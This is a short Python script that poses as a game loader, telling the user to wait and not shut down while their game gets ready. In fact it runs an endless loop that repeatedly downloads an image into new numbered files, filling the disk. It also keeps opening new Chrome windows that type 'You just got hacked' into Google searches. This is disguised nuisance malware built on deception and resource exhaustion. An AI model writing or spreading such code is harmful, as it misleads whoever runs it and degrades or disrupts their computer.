import requests
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
counter = 1

print("What is your name?")
a = input()
print("ahh hello there master " + a)
print("please wait as we get your game ready in the meantime please minimize and grab a snack your game will be ready soon please do not shut down")
while True:
    counter+=1
    f = open(str(counter)+'.jpg','wb')    
    f.write(requests.get('https://i.redd.it/g7fonfhf8n541.jpg').content)
    f.close()
    driver = webdriver.Chrome(r"C:\Users\Admin\Downloads\chromedriver_win32\chromedriver.exe")
    driver.get("https://www.google.com")
    driver.find_element_by_name("q").send_keys("You just got hacked ")
    driver.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')  
    driver.get("https://www.google.com")
    driver.find_element_by_name("q").send_keys("You just got hacked")
    driver.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')  
    driver.get("https://www.google.com")
    driver.find_element_by_name("q").send_keys("You just got hacked")
    driver.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')  

